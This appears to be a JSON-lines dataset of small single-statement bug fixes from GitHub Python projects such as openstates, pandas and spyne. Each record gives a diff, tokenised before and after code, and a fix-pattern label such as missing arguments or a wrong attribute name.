{"project": "openstates", "commit_sha": "614b8345d7c8d7cabf8d27fa4521b4513c10e5b6", "parent_sha": "6383e4fa19f32b241e57cb1f89e61e10394aeb27", "file_path": "openstates/al/bills.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -36,7 +36,7 @@ _action_re = (\n \n def _categorize_action(action):\n     for pattern, types in _action_re:\n-        if re.findall(pattern):\n+        if re.findall(pattern, action):\n             return types\n     return 'other'\n \n", "before": "if re . findall ( pattern ) : return types", "after": "if re . findall ( pattern , action ) : return types", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 22, 3, 31], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 22, 3, 31], [\"identifier:action\", \"T\"], 3]]"}
{"project": "openstates", "commit_sha": "df53c2205d1914e1054b7f460667671930b5b250", "parent_sha": "2c15ece593641c21810610b5ae5fc7f7a02130ec", "file_path": "openstates/in/bills.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -116,7 +116,7 @@ class INBillScraper(BillScraper):\n                 if action.startswith('Reassigned to'):\n                     atype.append('committee:referred')\n \n-                match = re.match(r'Amendment \\d+ \\(.*\\), (prevailed|failed)')\n+                match = re.match(r'Amendment \\d+ \\(.*\\), (prevailed|failed)', action)\n                 if match:\n                     if match.group(1) == 'prevailed':\n                         atype.append('amendment:passed')\n", "before": "match = re . match ( r'Amendment \\d+ \\(.*\\), (prevailed|failed)' )", "after": "match = re . match ( r'Amendment \\d+ \\(.*\\), (prevailed|failed)' , action )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 33, 3, 78], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 33, 3, 78], [\"identifier:action\", \"T\"], 3]]"}
{"project": "openstates", "commit_sha": "eaa463ca444396e5e052cfa686bc69c7ceb917a3", "parent_sha": "e61f01eedbde18151ab9547fd70b2c8ce29610f4", "file_path": "openstates/mo/committees.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ class MOCommitteeScraper(CommitteeScraper):\n                         mem_name = (mem_parts[1].strip() + ' ' +\n                                     mem_parts[0].strip())\n                         # Sometimes Senator abbreviation is in the name\n-                        mem_name = mem_name.replace(' Sen. ')\n+                        mem_name = mem_name.replace(' Sen. ', '')\n                         mem_role = 'member'\n                         if len(mem_parts) > 2:\n                             # Handle the case where there is a comma in the\n", "before": "mem_name = mem_name . replace ( ' Sen. ' )", "after": "mem_name = mem_name . replace ( ' Sen. ' , '' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 52, 3, 62], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 52, 3, 62], [\"string:''\", \"T\"], 3]]"}
{"project": "openstates", "commit_sha": "edbf88ab5d053e42aa37123dcd777b48a1a46b2a", "parent_sha": "af1f0ac6cf6099c9ee8bbf6a06ea1e869a31936a", "file_path": "openstates/mi/bills.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -190,5 +190,5 @@ class MIBillScraper(BillScraper):\n                     break\n                 else:\n                     # split on spaces not preceeded by commas\n-                    for l in re.split('(?<!,)\\s+'):\n+                    for l in re.split('(?<!,)\\s+', p):\n                         vtype(l)\n", "before": "else : for l in re . split ( '(?<!,)\\s+' ) : vtype ( l )", "after": "else : for l in re . split ( '(?<!,)\\s+' , p ) : vtype ( l )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 38, 3, 51], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 38, 3, 51], [\"identifier:p\", \"T\"], 3]]"}
{"project": "secrets-manager-2", "commit_sha": "ccac473a79a598964d3a8d246d23c03454b47f17", "parent_sha": "fa83c190a961f5c29f83405401b37f15fd82fcc0", "file_path": "test_command_controler.py", "project_url": "https://github.com/RcdFdz/secrets-manager-2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -160,7 +160,7 @@ def test_add_content_id_json():\n \tremove_files(['secrets_tmp39'])\n \n def test_add_content_id_json_firt_element():\n-\tgpg = GPGTools()\n+\tgpg = GPGTools(key = '12345')\n \tcmdc = CommandControler(gpg)\n \tcmdc.add_content_id_json(\"example\", '{\"user\":\"example\",\"password\":\"example\",\"url\":\"example\",\"other\":\"example\"}')\n \n", "before": "gpg = GPGTools ( )", "after": "gpg = GPGTools ( key = '12345' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 16, 3, 18], [\"keyword_argument\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:key\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'12345'\", \"T\"], 2]]"}
{"project": "Potato", "commit_sha": "716e8a9d4295686adf848ba6dec4df79a43d24ab", "parent_sha": "609e7a15aef9b838288c586f2bb96467f391d4e8", "file_path": "potato/backend/streamer.py", "project_url": "https://github.com/adityashinde1506/Potato", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,7 +35,7 @@ class Streamer:\n             self.curr_file.close()\n \n         try:\n-            self.curr_file=open(next(self.filename_iter))\n+            self.curr_file=open(next(self.filename_iter),errors='ignore')\n         except:\n             logger.error(f\"File iterator terminated.\")\n             self.curr_file=None\n", "before": "self . curr_file = open ( next ( self . filename_iter ) )", "after": "self . curr_file = open ( next ( self . filename_iter ) , errors = 'ignore' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 32, 3, 58], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 32, 3, 58], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:errors\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'ignore'\", \"T\"], 2]]"}
{"project": "openstates", "commit_sha": "dfeb65afa30dd6d507765f9819f05c48932643d3", "parent_sha": "22c5e3d12f9706e7611a255057c2d5f2a36e8c3d", "file_path": "billy/site/browse/views.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -162,7 +162,7 @@ def overview(request, abbr):\n \n     level = meta['_level']\n \n-    context.update(_bill_stats_for_session(abbr, latest_session))\n+    context.update(_bill_stats_for_session(level, abbr, latest_session))\n \n     # legislators\n     context['upper_leg_count'] = db.legislators.find({'_level': level,\n", "before": "context . update ( _bill_stats_for_session ( abbr , latest_session ) )", "after": "context . update ( _bill_stats_for_session ( level , abbr , latest_session ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Move\", [\"identifier:abbr\", 3, 44, 3, 48], [\"argument_list\", 3, 43, 3, 65], 2], [\"Insert\", [\"argument_list\", 3, 43, 3, 65], [\"identifier:level\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 43, 3, 65], [\",:,\", \"T\"], 3]]"}
{"project": "spyne", "commit_sha": "aa632d905df4e288efe160122f7c125aa750177e", "parent_sha": "46addac86cff9fe701540a93825db98dae01baa9", "file_path": "src/soaplib/wsgi.py", "project_url": "https://github.com/duixteam/spyne", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -528,7 +528,7 @@ class Application(object):\n \n         # FIXME: There's no way to alter soap response headers for the user.\n         envelope = etree.Element('{%s}Envelope' % soaplib.ns_soap_env)\n-        body = etree.SubElement(envelope, '{%s}Body' % soaplib.ns_soap_env)\n+        body = etree.SubElement(envelope, '{%s}Body' % soaplib.ns_soap_env, nsmap=soaplib.nsmap)\n         exc.__class__.to_xml(exc, self.get_tns(), body)\n \n         if not (service is None):\n", "before": "body = etree . SubElement ( envelope , '{%s}Body' % soaplib . ns_soap_env )", "after": "body = etree . SubElement ( envelope , '{%s}Body' % soaplib . ns_soap_env , nsmap = soaplib . nsmap )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 32, 3, 76], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 3, 32, 3, 76], [\"keyword_argument\", \"N0\"], 5], [\"Insert\", \"N0\", [\"identifier:nsmap\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:soaplib\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:nsmap\", \"T\"], 2]]"}
{"project": "openstates", "commit_sha": "ce784ed0dc55c620004a4906c8102ec9efd6a1d8", "parent_sha": "b8309f6acc1d8f8765718077fc5140459e443743", "file_path": "openstates/wa/events.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ class WAEventScraper(EventScraper):\n                                              namespaces=self._ns)\n                     name = \"%s %s Committee\" % (agency, name)\n \n-                    event.add_participant('committee', name)\n+                    event.add_participant('committee', name, chamber=agency)\n \n                 event.add_source(url)\n                 self.save_event(event)\n", "before": "event . add_participant ( 'committee' , name )", "after": "event . add_participant ( 'committee' , name , chamber = agency )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 42, 3, 61], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 3, 42, 3, 61], [\"keyword_argument\", \"N0\"], 5], [\"Insert\", \"N0\", [\"identifier:chamber\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:agency\", \"T\"], 2]]"}
{"project": "spyne", "commit_sha": "91e4f5a5ab5b1d4c1a50a7334ad47c3cb996be71", "parent_sha": "b6f11a5fbbdbe21a82ccfddf9300c2901b1fc40c", "file_path": "spyne/protocol/cloth/to_cloth.py", "project_url": "https://github.com/duixteam/spyne", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -174,7 +174,7 @@ class ToClothMixin(ProtocolBase):\n \n-        print(\"entering\", cloth.tag, cloth.attrib, \"skip=%s\" % skip)\n+        print(\"entering\", cloth.tag, cloth.attrib, cloth.nsmap, \"skip=%s\" % skip)\n \n         tags = ctx.protocol.tags\n         eltstack = ctx.protocol.eltstack\n", "before": "print ( \"entering\" , cloth . tag , cloth . attrib , \"skip=%s\" % skip )", "after": "print ( \"entering\" , cloth . tag , cloth . attrib , cloth . nsmap , \"skip=%s\" % skip )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 1, 14, 1, 69], [\"attribute\", \"N0\"], 7], [\"Insert\", [\"argument_list\", 1, 14, 1, 69], [\",:,\", \"T\"], 8], [\"Insert\", \"N0\", [\"identifier:cloth\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:nsmap\", \"T\"], 2]]"}
{"project": "plugins", "commit_sha": "b8db7f4e26ccfa0c4d5f26896538d7f3ae814f9e", "parent_sha": "706e9147cf8f8f268304815ed4a26c407013195f", "file_path": "v7/localsearch/localsearch/__init__.py", "project_url": "https://github.com/ChillarAnand/plugins", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -81,7 +81,7 @@ class Tipue(LateTask):\n                     data[\"title\"] = post.title(lang)\n                     data[\"text\"] = text\n                     data[\"tags\"] = \",\".join(post.tags)\n-                    data[\"url\"] = post.permalink(lang)\n+                    data[\"url\"] = post.permalink(lang, absolute=True)\n                     pages.append(data)\n             output = json.dumps({\"pages\": pages}, indent=2)\n             makedirs(os.path.dirname(dst_path))\n", "before": "data [ \"url\" ] = post . permalink ( lang )", "after": "data [ \"url\" ] = post . permalink ( lang , absolute = True )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 49, 3, 55], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 49, 3, 55], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:absolute\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"true:True\", \"T\"], 2]]"}
{"project": "pandas", "commit_sha": "4a70ba93f04c986ed5dac003a1c8dd19268a75c5", "parent_sha": "26c3a9b8d93f260bc6a37e755deac45a942ea96a", "file_path": "pandas/tests/test_indexing.py", "project_url": "https://github.com/jmwoloso/pandas", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -4048,7 +4048,7 @@ class TestIndexing(tm.TestCase):\n         # IntIndex #\n         ############\n         index = tm.makeIntIndex()\n-        s = Series(np.arange(len(index))+10,index+5)\n+        s = Series(np.arange(len(index),dtype='int64')+10,index+5)\n \n         # this is positional\n         result1 = s[2:5]\n", "before": "s = Series ( np . arange ( len ( index ) ) + 10 , index + 5 )", "after": "s = Series ( np . arange ( len ( index ) , dtype = 'int64' ) + 10 , index + 5 )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 29, 3, 41], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 29, 3, 41], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:dtype\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'int64'\", \"T\"], 2]]"}
{"project": "pandas", "commit_sha": "a03301ff7457751df0d18b864d0dce0204abc0dd", "parent_sha": "5017efe1b46f1bcdd14067e5666b8b0a41a85232", "file_path": "pandas/tseries/tests/test_resample.py", "project_url": "https://github.com/jmwoloso/pandas", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -384,7 +384,7 @@ class TestResample(tm.TestCase):\n         expected = DataFrame({'A' : Series([21,41,63], index=index)})\n \n         index = DatetimeIndex(start='20150101', end='20150331', freq='B')\n-        df = DataFrame({'A' : Series(range(len(index)),index=index)})\n+        df = DataFrame({'A' : Series(range(len(index)),index=index)},dtype='int64')\n         result = df.resample('BM', how='last')\n         assert_frame_equal(result, expected)\n \n", "before": "df = DataFrame ( { 'A' : Series ( range ( len ( index ) ) , index = index ) } )", "after": "df = DataFrame ( { 'A' : Series ( range ( len ( index ) ) , index = index ) } , dtype = 'int64' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 23, 3, 70], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 23, 3, 70], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:dtype\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'int64'\", \"T\"], 2]]"}
{"project": "pandas", "commit_sha": "91b68488fec24cb0283971778619f1c12cba3011", "parent_sha": "54f788a1c545c6b028dcd63a776d9f4fd7c9dbae", "file_path": "pandas/tests/test_tseries.py", "project_url": "https://github.com/jmwoloso/pandas", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -483,7 +483,7 @@ def test_group_ohlc():\n         bins = np.array([6, 12, 20], dtype=np.int64)\n         out = np.zeros((3, 4), dtype)\n         counts = np.zeros(len(out), dtype=np.int64)\n-        labels = np.repeat(np.arange(3), np.diff(np.r_[0, bins]))\n+        labels = np.repeat(np.arange(3, dtype='int64'), np.diff(np.r_[0, bins]))\n \n         func = getattr(algos,'group_ohlc_%s' % dtype)\n         func(out, counts, obj[:, None], labels)\n", "before": "labels = np . repeat ( np . arange ( 3 ) , np . diff ( np . r_ [ 0 , bins ] ) )", "after": "labels = np . repeat ( np . arange ( 3 , dtype = 'int64' ) , np . diff ( np . r_ [ 0 , bins ] ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 37, 3, 40], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 37, 3, 40], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:dtype\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'int64'\", \"T\"], 2]]"}
{"project": "pyspider", "commit_sha": "a387cea18af5f3464fb26d31b234d3570305e79f", "parent_sha": "ab30990d1389717c28a39590d8a040fd599ad00a", "file_path": "tests/test_database.py", "project_url": "https://github.com/atlas555/pyspider", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -588,7 +588,7 @@ class TestESProjectDB(ProjectDBCase, unittest.TestCase):\n \n     @classmethod\n     def tearDownClass(self):\n-        self.projectdb.es.indices.delete(index='test_pyspider')\n+        self.projectdb.es.indices.delete(index='test_pyspider', ignore=[400, 404])\n \n if __name__ == '__main__':\n     unittest.main()\n", "before": "self . projectdb . es . indices . delete ( index = 'test_pyspider' )", "after": "self . projectdb . es . indices . delete ( index = 'test_pyspider' , ignore = [ 400 , 404 ] )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 41, 3, 64], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 41, 3, 64], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:ignore\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"list\", \"N1\"], 2], [\"Insert\", \"N1\", [\"[:[\", \"T\"], 0], [\"Insert\", \"N1\", [\"integer:400\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"integer:404\", \"T\"], 3], [\"Insert\", \"N1\", [\"]:]\", \"T\"], 4]]"}
{"project": "openobject-client-6.0", "commit_sha": "31b07b4444b028a5d7634abd2dd807e5eae2649f", "parent_sha": "32d7a06a2ccb7e14aeb87b9c58ac4e647a38df58", "file_path": "bin/modules/action/main.py", "project_url": "https://github.com/hunslater/openobject-client-6.0", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -115,7 +115,7 @@ class main(service.Service):\n             if datas.get('domain', False):\n                 domain.append(datas['domain'])\n             if action.get('target', False)=='new':\n-                dia = dialog(datas['res_model'], window=datas.get('window',None), domain=domain, context=ctx, view_ids=view_ids,target=True, view_type=datas.get('view_mode', 'tree').split(','))\n+                dia = dialog(datas['res_model'], id=datas.get('res_id',None), window=datas.get('window',None), domain=domain, context=ctx, view_ids=view_ids,target=True, view_type=datas.get('view_mode', 'tree').split(','))\n                 if dia.dia.get_has_separator():\n                     dia.dia.set_has_separator(False)\n                 dia.run()\n", "before": "dia = dialog ( datas [ 'res_model' ] , window = datas . get ( 'window' , None ) , domain = domain , context = ctx , view_ids = view_ids , target = True , view_type = datas . get ( 'view_mode' , 'tree' ) . split ( ',' ) )", "after": "dia = dialog ( datas [ 'res_model' ] , id = datas . get ( 'res_id' , None ) , window = datas . get ( 'window' , None ) , domain = domain , context = ctx , view_ids = view_ids , target = True , view_type = datas . get ( 'view_mode' , 'tree' ) . split ( ',' ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 29, 3, 194], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", [\"argument_list\", 3, 29, 3, 194], [\",:,\", \"T\"], 4], [\"Insert\", \"N0\", [\"identifier:id\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"identifier:datas\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"string:'res_id'\", \"T\"], 1], [\"Insert\", \"N3\", [\",:,\", \"T\"], 2], [\"Insert\", \"N3\", [\"none:None\", \"T\"], 3], [\"Insert\", \"N3\", [\"):)\", \"T\"], 4]]"}
{"project": "hysen", "commit_sha": "e8e53a72da6e8318c946cea83b38badde3981abc", "parent_sha": "d9cc609feac8cf59d883baa69a2c1de41bd044d0", "file_path": "hysen.py", "project_url": "https://github.com/mairas/hysen", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -207,7 +207,7 @@ class BroadlinkHysenClimate(ClimateDevice):\n         attr['heating_active'] = self._is_heating_active\n         attr['auto_override'] = self.auto_override\n         attr['sensor_mode'] = self.sensor_mode\n-        attr['external_sensor_temprange'] = self.external_temp\n+        attr['external_sensor_temprange'] = self.external_sensor_temprange\n         attr['deadzone_sensor_temprange'] = self.deadzone_sensor_temprange\n         attr['loop_mode'] = self._loop_mode\n         attr['roomtemp_offset'] = self.roomtemp_offset\n", "before": "attr [ 'external_sensor_temprange' ] = self . external_temp", "after": "attr [ 'external_sensor_temprange' ] = self . external_sensor_temprange", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:external_temp\", 3, 50, 3, 63], \"external_sensor_temprange\"]]"}
{"project": "gitcher", "commit_sha": "f128e0923c542a20eeeca0eec74fbf650902203f", "parent_sha": "701df475973b2d2ba084c6f871073a621a587673", "file_path": "gitcher/prof.py", "project_url": "https://github.com/glezseoane/gitcher", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -29,7 +29,7 @@ class Prof(object):\n         self.signpref = signpref\n \n     def __str__(self):\n-        if self.signpref is not None:\n+        if self.signkey is not None:\n             signkey_str = self.signkey\n             if self.signpref:\n                 signpref_str = \"Autosign enabled\"\n", "before": "if self . signpref is not None : signkey_str = self . signkey if self . signpref : signpref_str = \"Autosign enabled\"", "after": "if self . signkey is not None : signkey_str = self . signkey if self . signpref : signpref_str = \"Autosign enabled\"", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:signpref\", 3, 17, 3, 25], \"signkey\"]]"}
{"project": "taserver", "commit_sha": "5c9c405418727d9cca1581e3079d4e4a60774e58", "parent_sha": "a7dbff577f6b96251c6b8b34a380b2be44fe31d8", "file_path": "game_server_launcher/launcher.py", "project_url": "https://github.com/Griffon26/taserver", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -256,7 +256,7 @@ class Launcher:\n         if self.login_server:\n             self.login_server.send(msg)\n         else:\n-            self.last_map_info_message = msg\n+            self.last_server_info_message = msg\n \n     def handle_map_info_message(self, msg):\n         self.logger.info('launcher: received map info from game controller')\n", "before": "self . last_map_info_message = msg", "after": "self . last_server_info_message = msg", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:last_map_info_message\", 3, 18, 3, 39], \"last_server_info_message\"]]"}
{"project": "fenapack", "commit_sha": "d91761801c043a002a9bb2a50711c8a6e689617a", "parent_sha": "75302d970a701a089cd4fe33bfe3d0398537c745", "file_path": "fenapack/field_split.py", "project_url": "https://github.com/blechta/fenapack", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -129,7 +129,7 @@ class PCD_preconditioner(object):\n         pc = ksp.getPC()\n         pc.setType(PETSc.PC.Type.CHOLESKY)\n         pc.setFactorSolverPackage('mumps')\n-        self._mp.setOption(PETSc.Mat.Option.SPD, True)\n+        self._ap.setOption(PETSc.Mat.Option.SPD, True)\n         ksp.setOperators(self._ap)\n         ksp.setUp()\n         self._ksp_ap = ksp\n", "before": "self . _mp . setOption ( PETSc . Mat . Option . SPD , True )", "after": "self . _ap . setOption ( PETSc . Mat . Option . SPD , True )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:_mp\", 3, 14, 3, 17], \"_ap\"]]"}
{"project": "PyLaia", "commit_sha": "a718b6963436f517f4bcb7acd25ddd2d14578663", "parent_sha": "d1a8dec35cdb8168619c5080d1659de6a3211418", "file_path": "laia/engine/htr_engine_wrapper.py", "project_url": "https://github.com/jpuigcerver/PyLaia", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -87,7 +87,7 @@ class HtrEngineWrapper(object):\n         return self._train_wer_meter\n \n     def valid_wer(self):\n-        return self._valid_cer_meter\n+        return self._valid_wer_meter\n \n     def run(self):\n         self._summary_format, self._summary_params = \\\n", "before": "return self . _valid_cer_meter", "after": "return self . _valid_wer_meter", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:_valid_cer_meter\", 3, 21, 3, 37], \"_valid_wer_meter\"]]"}
{"project": "serverless-application", "commit_sha": "bb9c5fde7eee5beff69eef63b93a8e3b9c028252", "parent_sha": "483572f0ce1d45c6d67207d950c05e4e6c5378d8", "file_path": "src/handlers/me/articles/public/republish/me_articles_public_republish.py", "project_url": "https://github.com/AlisProject/serverless-application", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -60,7 +60,7 @@ class MeArticlesPublicRepublish(LambdaBase):\n         article_content_edit_table.delete_item(Key={'article_id': self.params['article_id']})\n \n         try:\n-            TagUtil.create_and_count(self.dynamodb, article_info_before.get('tags'), self.params.get('tags'))\n+            TagUtil.create_and_count(self.elasticsearch, article_info_before.get('tags'), self.params.get('tags'))\n         except Exception as e:\n             logging.fatal(e)\n             traceback.print_exc()\n", "before": "TagUtil . create_and_count ( self . dynamodb , article_info_before . get ( 'tags' ) , self . params . get ( 'tags' ) )", "after": "TagUtil . create_and_count ( self . elasticsearch , article_info_before . get ( 'tags' ) , self . params . get ( 'tags' ) )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:dynamodb\", 3, 43, 3, 51], \"elasticsearch\"]]"}
{"project": "serverless-application", "commit_sha": "192bf63a8d318e6ddd2d5f38aaa63e995095df8d", "parent_sha": "00d605bc8597d478e506cf6c294d38b06d0a77c2", "file_path": "src/common/user_util.py", "project_url": "https://github.com/AlisProject/serverless-application", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -247,7 +247,7 @@ class UserUtil:\n         encrypted_data = base64.b64decode(byte_hash_data)\n         aes_iv = base64.b64decode(iv)\n         salt = os.environ['LOGIN_SALT']\n-        cipher = AES.new(salt, AES.iyaMODE_CBC, aes_iv)\n+        cipher = AES.new(salt, AES.MODE_CBC, aes_iv)\n         return cipher.decrypt(encrypted_data).decode()\n \n     @staticmethod\n", "before": "cipher = AES . new ( salt , AES . iyaMODE_CBC , aes_iv )", "after": "cipher = AES . new ( salt , AES . MODE_CBC , aes_iv )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:iyaMODE_CBC\", 3, 36, 3, 47], \"MODE_CBC\"]]"}
{"project": "strax", "commit_sha": "ba3eb8e9e3e18f7a9b4a2a855c107478c05f5e2b", "parent_sha": "546ab585e67210532a092dc11870b03b622af14f", "file_path": "strax/utils.py", "project_url": "https://github.com/AxFoundation/strax", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -63,7 +63,7 @@ def inherit_docstring_from(cls):\n \n \n @export\n-def growing_result(dtype=np.int, chunk_size=10000):\n+def growing_result(dtype=np.int64, chunk_size=10000):\n", "before": "def growing_result ( dtype = np . int , chunk_size = 10000 ) : ", "after": "def growing_result ( dtype = np . int64 , chunk_size = 10000 ) : ", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:int\", 3, 29, 3, 32], \"int64\"]]"}
{"project": "knowledge-repo", "commit_sha": "1b1ea7b54a8395c2e35eb51892d7d4e0f7f225d4", "parent_sha": "6cb64c8b504dab5b9de667dc12e38768611f03fa", "file_path": "knowledge_repo/repositories/gitrepository.py", "project_url": "https://github.com/RasaHQ/knowledge-repo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -119,7 +119,7 @@ class GitKnowledgeRepository(KnowledgeRepository):\n \n     def update(self, branch=None):\n         branch = branch or self.config.published_branch\n-        if not self.has_remote:\n+        if not self.git_has_remote:\n             return\n         if not self.__remote_available:\n             logger.warning(\"Cannot connect to remote repository hosted on {}. Continuing locally with potentially outdated code.\".format(\n", "before": "if not self . has_remote : return", "after": "if not self . git_has_remote : return", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:has_remote\", 3, 21, 3, 31], \"git_has_remote\"]]"}
